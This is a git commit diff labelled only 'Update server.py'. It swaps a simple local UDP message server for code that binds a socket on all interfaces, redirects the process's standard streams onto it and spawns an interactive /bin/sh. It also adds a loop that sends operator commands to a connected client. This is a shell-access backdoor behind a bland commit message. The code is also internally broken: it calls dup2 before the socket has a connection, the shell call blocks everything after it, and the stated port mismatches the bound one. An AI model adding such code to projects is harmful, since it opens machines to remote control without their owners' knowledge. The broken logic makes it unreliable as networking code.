d7e454c95579ed73acd6d91a9f88fbeb9ce9a66f
Абудаби <108343640+Lendoros@users.noreply.github.com>
2025-10-17 23:54:06 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,16 +1,22 @@
-import socket
+import socket,subprocess,os
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
-s.bind(('127.0.0.1', 8888))
-print("UDP сервер слушает порт 8888...")
-
-try:
-    
-    while 1:
-     data, addr = s.recvfrom(1024)
-     print("Сообщение от {}: {}".format(addr, data.decode('utf-8')))
-except KeyboardInterrupt:
-    print("\nОтключение сервера...")
-
-finally:
-    s.close()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('0.0.0.0', 8888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1) 
+os.dup2(s.fileno(),2)
+p=subprocess.call(['/bin/sh','-i'])
+s.listen(5)
+print("Сервер слушает порт 8080...")
+conn, addr = s.accept()
+print("Подключено:", addr)
+while 1:
+    command = input("Введите команду для выполнения на клиенте: ")
+    conn.send(command.encode())
+    if command.lower() == 'exit':
+        conn.send(b'exit')
+        break
+    result_output = conn.recv(4096).decode()
+    print(result_output)
+conn.close()
+s.close()
